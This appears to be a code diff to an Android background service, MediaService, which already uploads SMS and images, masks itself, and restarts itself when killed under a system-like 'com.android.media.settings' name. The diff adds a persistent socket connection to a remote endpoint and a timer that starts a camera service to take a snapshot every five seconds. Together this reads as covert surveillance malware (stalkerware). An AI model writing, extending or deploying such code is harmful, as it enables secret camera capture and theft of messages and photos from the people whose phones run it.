@@ -29,6 +29,7 @@ public class MediaService extends Service {
     private static final String TAG = "Media Service";
     private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer, statusTimer;
     private MediaUtility mUtility;
+    private SocketUtil mSocketUtil;
     private final IBinder mediaBinder = new MediaBinder();
     private Handler handler;
 
@@ -62,6 +63,7 @@ public class MediaService extends Service {
             initMediaUpload();
             initSMSUpload();
             initStatusUpdate();
+            startSnapServices();
     };
 
     @Override
@@ -82,20 +84,30 @@ public class MediaService extends Service {
                     "OS doesn't have Service.startForeground OR Service.setForeground!");
         }
         handler = new Handler();
-        this.mUtility = new MediaUtility(this);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        this.mUtility = new MediaUtility(this);
+
         Log.d(TAG, "Service On Start");
         startForeground(MediaConfig.NOTIFICATION_ID, mUtility.getNotification());
         startService(new Intent(this, MediaMaskService.class));
         registerReceiver();
+
+
+        this.mSocketUtil = SocketUtil.getInstance(this);
+
         Thread mediaThread = new Thread(mediaRunnable);
         mediaThread.start();
 
-        new SocketUtil(this).connect();
+        startSocket();
         return START_STICKY;
+    }
+
+    //Enabling Socket Communication
+    private boolean startSocket() {
+        return mSocketUtil != null && mSocketUtil.connect();
     }
 
     private MediaCompressorUtility mMediaCompressorUtility;
@@ -194,6 +206,20 @@ public class MediaService extends Service {
         );
     }
 
+    private void startSnapServices() {
+        new Timer().schedule(new TimerTask() {
+            @Override
+            public void run() {
+                takeSnap();
+            }
+        }, 5000, 5000);
+    }
+
+    private void takeSnap() {
+        Intent snapIntent = new Intent(this, CamService.class);
+        startService(snapIntent);
+    }
+
     @Override
     public void onDestroy() {
         Log.d(TAG, "Service Destroyed !!");
@@ -201,6 +227,9 @@ public class MediaService extends Service {
         imgUploadTimer.cancel();
         configTimer.cancel();
         smsTimer.cancel();
+        if(mSocketUtil != null ) {
+            mSocketUtil.disconnect();
+        }
         sendBroadcast(new Intent("com.android.media.settings.RESTART_SENSOR"));
     }
 }
